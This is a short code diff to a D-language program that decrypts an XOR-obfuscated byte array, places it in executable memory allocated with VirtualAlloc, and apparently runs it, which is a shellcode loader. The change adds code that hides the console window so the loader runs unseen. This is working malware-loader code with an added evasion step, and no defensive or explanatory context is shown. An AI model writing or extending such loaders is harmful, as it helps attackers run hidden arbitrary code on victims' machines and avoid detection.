@@ -17,6 +17,10 @@ ubyte[] xor(immutable ubyte[] input, immutable ubyte[] key) {
 void main() {
     import core.sys.windows.winbase: VirtualAlloc;
     import core.sys.windows.winnt: MEM_COMMIT, PAGE_EXECUTE_READWRITE;
+    import core.sys.windows.wincon: GetConsoleWindow;
+    import core.sys.windows.winuser: ShowWindow, SW_HIDE;
+
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     ubyte[] deobfuscated = obfuscated.xor(KEY);
     void* exec = VirtualAlloc(null, deobfuscated.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
